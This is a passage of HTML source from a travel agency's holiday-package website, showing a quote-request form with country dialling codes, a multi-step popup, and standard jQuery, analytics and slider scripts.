value="692" >Marshall Islands(+692)</option><option value="596" >Martinique(+596)</option><option value="222" >Mauritania(+222)</option><option value="230" >Mauritius(+230)</option><option value="52" >Mexico(+52)</option><option value="691" >Micronesia, Federated States of(+691)</option><option value="373" >Moldova, Republic of(+373)</option><option value="377" >Monaco(+377)</option><option value="976" >Mongolia(+976)</option><option value="382" >Montenegro(+382)</option><option value="1664" >Montserrat(+1664)</option><option value="212" >Morocco(+212)</option><option value="258" >Mozambique(+258)</option><option value="95" >Myanmar(+95)</option><option value="264" >Namibia(+264)</option><option value="674" >Nauru(+674)</option><option value="977" >Nepal(+977)</option><option value="31" >Netherlands(+31)</option><option value="599" >Netherlands Antilles(+599)</option><option value="687" >New Caledonia(+687)</option><option value="64" >New Zealand(+64)</option><option value="505" >Nicaragua(+505)</option><option value="227" >Niger(+227)</option><option value="234" >Nigeria(+234)</option><option value="683" >Niue(+683)</option><option value="1670" >Northern Mariana Islands(+1670)</option><option value="47" >Norway(+47)</option><option value="968" >Oman(+968)</option><option value="92" >Pakistan(+92)</option><option value="680" >Palau(+680)</option><option value="970" >Palestinian Territory, Occupied(+970)</option><option value="507" >Panama(+507)</option><option value="675" >Papua New Guinea(+675)</option><option value="595" >Paraguay(+595)</option><option value="51" >Peru(+51)</option><option value="63" >Philippines(+63)</option><option value="48" >Poland(+48)</option><option value="351" >Portugal(+351)</option><option value="1787" >Puerto Rico(+1787)</option><option value="974" >Qatar(+974)</option><option value="262" >Reunion(+262)</option><option value="40" >Romania(+40)</option><option value="250" >Rwanda(+250)</option><option value="290" >Saint Helena(+290)</option><option value="1869" >Saint Kitts and Nevis(+1869)</option><option value="1758" >Saint Lucia(+1758)</option><option value="508" >Saint Pierre and Miquelon(+508)</option><option value="1784" >Saint Vincent and the Grenadines(+1784)</option><option value="684" >Samoa(+684)</option><option value="378" >San Marino(+378)</option><option value="239" >Sao Tome and Principe(+239)</option><option value="966" >Saudi Arabia(+966)</option><option value="221" >Senegal(+221)</option><option value="381" >Serbia(+381)</option><option value="248" >Seychelles(+248)</option><option value="232" >Sierra Leone(+232)</option><option value="65" >Singapore(+65)</option><option value="421" >Slovakia(+421)</option><option value="386" >Slovenia(+386)</option><option value="677" >Solomon Islands(+677)</option><option value="252" >Somalia(+252)</option><option value="27" >South Africa(+27)</option><option value="211" >South Sudan(+211)</option><option value="34" >Spain(+34)</option><option value="94" >Sri Lanka(+94)</option><option value="249" >Sudan(+249)</option><option value="597" >Suriname(+597)</option><option value="268" >Swaziland(+268)</option><option value="46" >Sweden(+46)</option><option value="41" >Switzerland(+41)</option><option value="963" >Syrian Arab Republic(+963)</option><option value="886" >Taiwan, Province of China(+886)</option><option value="992" >Tajikistan(+992)</option><option value="255" >Tanzania, United Republic of(+255)</option><option value="66" >Thailand(+66)</option><option value="670" >Timor-Leste(+670)</option><option value="228" >Togo(+228)</option><option value="690" >Tokelau(+690)</option><option value="676" >Tonga(+676)</option><option value="1868" >Trinidad and Tobago(+1868)</option><option value="216" >Tunisia(+216)</option><option value="90" >Turkey(+90)</option><option value="7370" >Turkmenistan(+7370)</option><option value="1649" >Turks and Caicos Islands(+1649)</option><option value="688" >Tuvalu(+688)</option><option value="256" >Uganda(+256)</option><option value="380" >Ukraine(+380)</option><option value="971" >United Arab Emirates(+971)</option><option value="44" >United Kingdom(+44)</option><option value="1" >United States(+1)</option><option value="598" >Uruguay(+598)</option><option value="998" >Uzbekistan(+998)</option><option value="678" >Vanuatu(+678)</option><option value="58" >Venezuela(+58)</option><option value="84" >Viet Nam(+84)</option><option value="1284" >Virgin Islands, British(+1284)</option><option value="1340" >Virgin Islands, U.s.(+1340)</option><option value="681" >Wallis and Futuna(+681)</option><option value="967" >Yemen(+967)</option><option value="260" >Zambia(+260)</option><option value="263" >Zimbabwe(+263)</option>		</select>
            <input type="text" name="txtPhone" class="form-control half-width numeric" required style="width: 55% !important;float: right;" />
          </div>
          <div class="col-xs-6 m_top10 resYes">
            <label class="txtCol" style="color:#FFF;">Depature city<span style="color:red;">*</span></label>
            <input type="text" name="txtCity" class="form-control full-width" required />
          </div>
          <div class="col-xs-8 m_top10 resYes">
            <label class="txtCol" style="color:#FFF;">Prefer call time<span style="color:red;">*</span></label>
            <select name="txtCallTime" class="form-control full-width" required>
              <option value="">Select...</option>
              <option value="Anytime">Anytime</option>
              <option value="Morning">Morning</option>
              <option value="Afternoon">Afternoon</option>
              <option value="Evening">Evening</option>
            </select>
          </div>
          <div style="clear:both;"></div>
          <div class="col-md-12 m_top35">
            <span style="text-align:left;width: 50%;float: left;"><a href="Javascript:void(0);" class="do_people link"><img src="https://travelsetu.com/holiday-tour-packages/images/previous.png" alt="" /></a></span>
            <span style="text-align:right;width: 50%;float: right;"><button type="submit" name="btnGetQuote" class="btn btn-success people-next">SUBMIT</button></span>
          </div>
          <div class="col-xs-12 m_top10" style="height:20px;"></div>
        </div>
        <div class="col-md-12 no-padding" id="message" style="display:none;text-align:center;">
          <h2 class="popupHeading" style="text-align:center;">Thanks for your inquiry. We will back to you Asap.</h2><br><br><br>
        </div>
      </form>
    </div>
    <div class="clearfix"></div>


              </div>
            </div>
          </div>
          <!-- Modal End -->

      <!-- ################## Footer Script Start ################## -->
          <script src="https://cdn.ywxi.net/js/1.js" async></script>
        <!-- Javascript -->
        <script src="https://travelsetu.com/holiday-tour-packages/js/jquery-1.11.1.min.js"></script>
        <script src="https://travelsetu.com/holiday-tour-packages/js/jquery-bootstrap-modal-steps.js"></script>
        <script>
          $('#myModal').modalSteps();
        </script>
        <!-- <script src="https://travelsetu.com/holiday-tour-packages/js/jquery.noconflict.js"></script> -->
        <script>
        <!--
            tjq = jQuery.noConflict();
        //-->
        </script>
        <script src="https://travelsetu.com/holiday-tour-packages/js/modernizr.2.7.1.min.js"></script>
        <script src="https://travelsetu.com/holiday-tour-packages/js/jquery-migrate-1.2.1.min.js"></script>
        <script src="https://travelsetu.com/holiday-tour-packages/js/jquery.placeholder.js"></script>
        <script src="https://travelsetu.com/holiday-tour-packages/js/jquery-ui.1.10.4.min.js"></script>
        <!-- Twitter Bootstrap -->
        <script src="https://travelsetu.com/holiday-tour-packages/js/bootstrap.min.js"></script>
        <!-- load BXSlider scripts -->
        <script src="https://travelsetu.com/holiday-tour-packages/components/jquery.bxslider/jquery.bxslider.min.js"></script>
        <!-- Flex Slider -->
        <script src="https://travelsetu.com/holiday-tour-packages/components/flexslider/jquery.flexslider.js"></script>
        <!-- parallax -->
        <script src="https://travelsetu.com/holiday-tour-packages/js/jquery.stellar.min.js"></script>
        <!-- parallax -->
        <script src="https://travelsetu.com/holiday-tour-packages/js/jquery.stellar.min.js"></script>
        <!-- waypoint -->
        <script src="https://travelsetu.com/holiday-tour-packages/js/waypoints.min.js"></script>
        <!-- load page Javascript -->
        <script src="https://travelsetu.com/holiday-tour-packages/js/theme-scripts.js"></script>
        <!-- <script src="https://travelsetu.com/holiday-tour-packages/js/scripts.js"></script> -->
        <script>
        <!--
            tjq(document).ready(function(){});
        //-->
        </script>

        <link href="https://travelsetu.com/holiday-tour-packages/css/bootstrap-datetimepicker.min.css" rel="stylesheet" media="screen">
        <script src="https://travelsetu.com/holiday-tour-packages/js/bootstrap-datetimepicker.js" charset="UTF-8"></script>


        <!-- <script>
          (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
          (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
          })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

          ga('create', 'UA-70610149-1', 'auto');
          ga('send', 'pageview');

        </script> -->

        <script async src="https://www.googletagmanager.com/gtag/js?id=UA-107771514-1"></script>
        <script>
          window.dataLayer = window.dataLayer || [];
          function gtag(){dataLayer.push(arguments);}
          gtag('js', new Date());

          gtag('config', 'UA-107771514-1');
        </script>

    <!-- <link rel="stylesheet" href="https://travelsetu.com/holiday-tour-packages/css/jquery-ui.css">
    <script src="https://travelsetu.com/holiday-tour-packages/js/jquery-ui.js"></script> -->
    <script>
    <!--
        tjq(document).ready(function(){
            tjq('[data-toggle="tooltip"]').tooltip();
        });
        function autocomplet()
        {
            var min_length = 0; // min caracters to display the autocomplete
            var keyword = tjq('#destination').val();
            if (keyword.length >= min_length) {
                tjq.ajax({
                    url: 'https://travelsetu.com/holiday-tour-packages/ajax.php',
                    type: 'POST',
                    data: {
                       keyword: keyword,
                       action: 'destination'
                    },
                    success:function(data){
                        tjq('#destination_list_id').show();
                        tjq('#destination_list_id').html(data);
                    }
                });
            } else {
                tjq('#destination_list_id').hide();
            }
        }
        // set_item : this function will be executed when we select an item
        function set_item(item) {
            // change input value
            tjq('#destination').val(item);
            // hide proposition list
            tjq('#destination_list_id').hide();
        }

        function autocompleti()
        {
            var min_length = 0; // min caracters to display the autocomplete
            var keyword = tjq('#destinationi').val();
            if (keyword.length >= min_length) {
                tjq.ajax({
                    url: 'https://travelsetu.com/holiday-tour-packages/ajax.php',
                    type: 'POST',
                    data: {
                       keyword: keyword,
                       action: 'destinationi'
                    },
                    success:function(data){
                        tjq('#destinationi_list_id').show();
                        tjq('#destinationi_list_id').html(data);
                    }
                });
            } else {
                tjq('#destinationi_list_id').hide();
            }
        }
        // set_item : this function will be executed when we select an item
        function set_itemi(item) {
            // change input value
            tjq('#destinationi').val(item);
            // hide proposition list
            tjq('#destinationi_list_id').hide();
        }
    //-->
    </script>

    <!-- Popup Script -->
    <script>
    <!--
        function selectDestination(dest_id,type,count,num)
        {
            tjq("#sub_desti_type").val(type);
            tjq("#sub_desti_number").val(count);
            if(count == 0)
            {
                tjq("#dest_dom").hide(300);
                tjq("#dest_int").hide(300);
                tjq("#hotel_star").show(300);
            }
            else
            {
                tjq.ajax({
                    type:'POST',
                    url:'https://travelsetu.com/holiday-tour-packages/ajax.php',
                    data:{
                            action: 'get_quote_sub_destination',
                            id: dest_id,
                            type: type,
                            num: num
                        },
                    success:function(data){
                            //alert(data);
                        tjq('#sub_destination_list').html(data);
                        tjq("#dest_dom").hide(300);
                        tjq("#dest_int").hide(300);
                        tjq("#sub_dest").show(300);
                    }
                });
            }
        }

        tjq(document).ready(function(){
            tjq(".ch_dom").click(function(){
                tjq("#choose").hide(300);
                tjq("#dest_dom").show(300);
            });
            tjq(".ch_int").click(function(){
                tjq("#choose").hide(300);
                tjq("#dest_int").show(300);
            });
            tjq(".hotel_star").click(function(){
                tjq("#hotel_star").hide(300);
                tjq("#flight_train").show(300);
            });
            tjq(".flight_train").click(function(){
                tjq("#flight_train").hide(300);
                tjq("#dep_date").show(300);
            });
            tjq(".holiday").click(function(){
                tjq("#holiday").hide(300);
                tjq("#budget").show(300);
            });
            tjq(".budget").click(function(){
                tjq("#budget").hide(300);
                tjq("#will_book").show(300);
            });
            tjq(".will_book").click(function(){
                tjq("#will_book").hide(300);
                tjq("#people").show(300);
            });
            tjq(".people-next").click(function(){
                tjq("#details").hide(300);
                tjq("#message").show(300);
            });


            tjq(".do_previous_choose").click(function(){
                tjq("#choose").show(300);
                tjq("#dest_dom").hide(300);
                tjq("#dest_int").hide(300);
            });
            tjq(".do_previous_sub_deti").click(function(){
                var number = tjq("#sub_desti_number").val();
                var type = tjq("#sub_desti_type").val();
                if(number == 0)
                {
                    if(type == 'dom')
                    {
                        tjq("#dest_dom").show(300);
                    }
                    else
                    {
                        tjq("#dest_int").show(300);
                    }
                    tjq("#hotel_star").hide(300);
                }
                else
                {
                    tjq("#sub_dest").show(300);
                    tjq("#hotel_star").hide(300);
                }
            });
            tjq(".do_previous_star").click(function(){
                tjq("#hotel_star").show(300);
                tjq("#flight_train").hide(300);
            });
            tjq(".do_previous_flight").click(function(){
                tjq("#flight_train").show(300);
                tjq("#dep_date").hide(300);
            });
            tjq(".do_previous_date").click(function(){
                tjq("#dep_date").show(300);
                tjq("#holiday").hide(300);
            });
            tjq(".do_previous_holiday").click(function(){
                tjq("#holiday").show(300);
                tjq("#budget").hide(300);
            });
            tjq(".do_previous_budget").click(function(){
                tjq("#budget").show(300);
                tjq("#will_book").hide(300);
            });
            tjq(".do_will_book").click(function(){
                tjq("#will_book").show(300);
                tjq("#people").hide(300);
            });
            tjq(".do_people").click(function(){
                tjq("#people").show(300);
                tjq("#details").hide(300);
            });
            tjq(".popup").click(function(){
                tjq('input[type="radio"]').prop('checked', false);
                tjq("#choose").show(300);
                tjq("#dest_dom").hide(300);
                tjq("#dest_int").hide(300);
                tjq("#sub_dest").hide(300);
                tjq("#hotel_star").hide(300);
                tjq("#flight_train").hide(300);
                tjq("#dep_date").hide(300);
                tjq("#holiday").hide(300);
                tjq("#budget").hide(300);
                tjq("#will_book").hide(300);
                tjq("#people").hide(300);
                tjq("#details").hide(300);
                tjq("#message").hide(300);
            });
        });

        tjq(function() {
            tjq(".form_datetime").datetimepicker({
                format: "dd MM yyyy - HH:ii P",
                showMeridian: true,
                autoclose: true,
                todayBtn: false,
                startDate: new Date(),
                pickerPosition: "bottom-left",
                orientation: "auto"
            });
        });


        tjq(function() {
            tjq("#datePicker").datepicker({minDate: 0,
                onSelect: function (date, obj) {
                    tjq('#txtDate').val(date);
                    tjq("#dep_date").hide(300);
                    tjq("#holiday").show(300);
                }
            });
        });

        tjq(".incr-btn").on("click", function (e) {
             var $button = tjq(this);
             var oldValue = $button.parent().find('.quantity').val();
             $button.parent().find('.incr-btn[data-action="decrease"]').removeClass('inactive');
             if ($button.data('action') == "increase") {
                 var newVal = parseFloat(oldValue) + 1;
             } else {
                 // Don't allow decrementing below 1
                 if (oldValue > 0) {
                     var newVal = parseFloat(oldValue) - 1;
                 } else {
                     newVal = 0;
                     $button.addClass('inactive');
                 }
             }
             $button.parent().find('.quantity').val(newVal);
             e.preventDefault();
        });

        tjq('.numeric').on('input', function (event) {
            this.value = this.value.replace(/[^.0-9]/g, '');
        });

        function checkPeople()
        {
            var adultNu = tjq('#txtAdult').val();
            if(adultNu == 0)
            {
                tjq("#showPeAlert").html("Please add adult number!");
            }
            else
            {
                tjq("#showPeAlert").html("");
                tjq("#people").hide(300);
                tjq("#details").show(300);
            }
        }

        tjq(window).load(function(){
            setTimeout(function() {
              tjq('#myModal').modal('show');
            }, 30000); // milliseconds
        });

    //-->
    </script>


      <!-- ################## Footer Script End ################## -->

        <!-- load revolution slider scripts -->
        <script src="https://travelsetu.com/holiday-tour-packages/components/revolution_slider/js/jquery.themepunch.tools.min.js"></script>
        <script src="https://travelsetu.com/holiday-tour-packages/components/revolution_slider/js/jquery.themepunch.revolution.min.js"></script>
        <script>
            tjq(document).ready(function() {
                tjq('.revolution-slider').revolution(
                {
                    sliderType:"standard",
                    sliderLayout:"auto",
                    dottedOverlay:"none",
                    delay:9000,
                    navigation: {
                        keyboardNavigation:"off",
                        keyboard_direction: "horizontal",
                        mouseScrollNavigation:"off",
                        mouseScrollReverse:"default",
                        onHoverStop:"on",
                        touch:{
                            touchenabled:"on",
                            swipe_threshold: 75,
                            swipe_min_touches: 1,
                            swipe_direction: "horizontal",
                            drag_block_vertical: false
                        }
                        ,
                        arrows: {
                            style:"default",
                            enable:true,
                            hide_onmobile:false,
                            hide_onleave:false,
                            tmp:'',
                            left: {
                                h_align:"left",
                                v_align:"center",
                                h_offset:20,
                                v_offset:0
                            },
                            right: {
                                h_align:"right",
                                v_align:"center",
                                h_offset:20,
                                v_offset:0
                            }
                        }
                    },
                    visibilityLevels:[1240,1024,778,480],
                    gridwidth:1170,
                    gridheight:646,
                    lazyType:"none",
                    shadow:0,
                    spinner:"spinner4",
                    stopLoop:"off",
                    stopAfterLoops:-1,
                    stopAtSlide:-1,
                    shuffle:"off",
                    autoHeight:"off",
                    hideThumbsOnMobile:"off",
                    hideSliderAtLimit:0,
                    hideCaptionAtLimit:0,
                    hideAllCaptionAtLilmit:0,
                    debugMode:false,
                    fallbacks: {
                        simplifyAll:"off",
                        nextSlideOnWindowFocus:"off",
                        disableFocusListener:false,
                    }
                });
            });
        </script>
      </body>
    </html>
